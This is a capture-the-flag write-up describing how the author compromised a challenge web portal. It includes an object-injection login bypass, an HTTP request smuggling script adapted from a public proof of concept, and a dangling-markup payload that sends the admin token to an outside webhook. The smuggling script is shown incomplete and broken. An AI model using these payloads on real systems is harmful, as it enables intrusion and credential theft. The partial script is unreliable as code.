## SOLUTION

In this stage, I am required to gain access to a web portal and exfiltrate the admin’s access token.

I visited the web portal and was prompted with a login screen. I suppose some form of injection is required to bypass the authentication. There is input validation on the email field, but that can be circumvented by intercepting the HTTP request using Burp Suite and modifying the field before forwarding.

![image](/assets/img/tisc_2022/level_5/46c647da05f1f963243105576be1f60021cd7f72c331d6812d4254be4bed26ff.png)  

Reviewing the source code, I noted that the credentials were stored in a MySQL database and retrieved with this SQL query.

```
const rows = await query(`SELECT * FROM users WHERE email = ? AND password = ?`, [email, password])
if (rows.length === 0)
    return res.status(401).send({ message: 'Invalid email or password' })
```

Attempted performing normal SQL injection of the following form as well as variants of it but were not successful.

```
{“email” = “’ OR ‘1’ = ‘1”...
```

Researching further on SQL query, I discovered that the SQL query is a ‘parameterized query’. A placeholder (?) is substituted for the parameter in the SQL query. The parameter is then passed to the query in a separate statement. This is a defence mechanism against Injection Attacks.

Reference material: `https://www.techopedia.com/definition/24414/parameterized-query`

Researching further, I chanced upon an article describing how Injection Attack can still be performed against parameterized query. This was made possible by how different types of inputs were escaped.

Reference material: `https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4`

I modified the HTTP request body to include JSON objects in the inputs. With this, I managed to login into the web portal.

```
{"email":{"email":1},"password":{"password":1}}
```

Summarising the web portal features:
1. Get Token
- Submit a username.
- Get a token (type:string) in return.
- If you already have a token, the page will welcome you back and show you your token.
2. Verify Token
- Submit a token to verify.
- If a valid token is submitted, the page will tell you who this token belongs to and also your own token.
3. Report a Site
- Submit a URL for the admin to check.
- However, the function is only available to local administrators.

Reviewing the source code, report.js contains a puppeteer function that will visit the url submitted. However, it is mapped to /forbidden.

| File | Code |
| --- | --- |
| `report.js` | `module.exports = { doReportHandler }` |
| `main.js` | `app.get     ('/report-issue', authenticationMiddleware, reportIssueHandler)` |
| `proxy/remap.config` | `map  /do-report  http://app:8000/forbidden` |

Using Burp Suite extensions `403 Bypasser` and `Bypass WAF`, I was still unable to `POST` to `/do-report`.

Feeling extremely frustrated after a lot of different attempts, I decided to return to fundamentals. Perhaps I was missing something important. I performed `npm audit` on `package.json` in hope of finding some vulnerability, but there was none reported.

I then decided to research if there was any vulnerability associated with `Apache Traffic Server 9.1.0` and discovered that HTTP Request Smuggling (HRS) was possible.

Research material: `https://portswigger.net/web-security/request-smuggling`

I tried several variations of HRS manually but those attempts were unsuccessful. I also used Burp Suite extension `HTTP Request Smuggler` but was still unsuccessful.

I was ready to give up. Just as I was randomly throwing search terms at Google search engine, I encountered this twitter post. This surprised me as the Node/ATS setup is exactly what I was working with for the last few nights.

Research material: `https://hackerone.com/reports/1238099`

Research further, I learnt that the 11http parser in the http module in Node 16.3.0 ignores chunk extensions when parsing the body of chunked requests. This leads to HTTP Request Smuggling (HRS) when a Node server is put behind an Apache Traffic Server (ATS) 9.0.0 proxy.

To my surprise, a Proof-of-Concept (POC) was also provided. I downloaded the zip and examined payload.py. It was here I learnt that a combination of chunk encoding and improper parsing of Carriage Return Line Feed (`\r \n`) bytes allowed HRS to occur.

When performing this HRS, the author explained that ATS will see one request to the destination while Node sees two requests. However, due to a bug in ATS where the connection hangs after a chunked request is sent, a smuggled request can be sent and the response cannot be seen. On the bright side, there is full control over the headers and body of the smuggled request. This is good enough for me.

Using payload.py as a base, I drafted a separate python script to attempt HRS once again.

After multiple adjustments to the script, my webhook received a `GET` request! The HTTP request was successfully smuggled in and doReportHandler ran. I was able to control which url the puppeteer will be visiting, bypassing `/forbidden`.

Demonstration of HRS using the modified exploit

Modified HRS python script: `test.py`

```python
import sys

"""
Update the cookie, change url to be visited and calculate the length of the chunk of the smuggled HTTP request body in hexadecimal format before running it
"""

smuggled = (
    b"POST /do-report HTTP/1.1\r\n" +
    b"Host: chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627\r\n" +
    b"Content-Type: application/json\r\n" +

    b"0\r\n" +
    b"\r\n"
)

def h(n):
    return hex(n)[2:].encode()

smuggled_len = h(len(smuggled) - 7 + 5)

first_chunk_len = h(len(smuggled_len))

sys.stdout.buffer.write(
    b"GET /index HTTP/1.1\r\n" +

    b"0\r\n" +
    b"\r\n" +

Webhook received `GET` request

Moving on, I proceeded with the exfiltration of the admin token.

From the source code, I noted that the admin token will only be loaded if the request came from localhost. This can be accomplished with the puppeteer in `report.js`.

```
const authenticationMiddleware = async (req, res, next) => {
    if (req.session.userId) {
        if (req.ip === '127.0.0.1')
            req.session.token = process.env.ADMIN_TOKEN
```

I theorised that one possible way to exfiltrate the admin token is by performing Cross Site Scripting (XSS). Interestingly, on `/token`, when submitting username, there is no input validation. On `/verify`, submitting a valid token will return the associated username.

After multiple attempts at different variations of XSS, the dangling markup injection succeeded in returning the admin token.

Research material: `https://portswigger.net/web-security/cross-site-scripting/dangling-markup`

First, I submitted the following as the username on `/token` and received the token, TISC{j:z:4:a:c:x:4:q:h:r}.

```
"><img src="https://webhook.site/3679c477-d9d2-4dd2-8e15-d1a05451c8e6?a=
```

Research material: `https://www.semrush.com/blog/url-parameters/`

Then, I prepared the URL using URL encoding. By submitting this URL, the puppeteer could visit the page as localhost and verify the token, `TISC{j:z:4:a:c:x:4:q:h:r}`.

```
http://localhost:8000/verify?token=TISC%7Bj%3Az%3A4%3Aa%3Ac%3Ax%3A4%3Aq%3Ah%3Ar%7D
```

After that, I modified the test.py to include updated cookie, URL to be visited and length of the current chunk in hexadecimal format.

Running command `python test.py | nc 128.199.237.165 23627`, HRS attempt was successful and I received a `GET` request on the webook.

Admin token will be displayed under `Query strings`, `a`.

Flag is the admin token submitted in flag format.
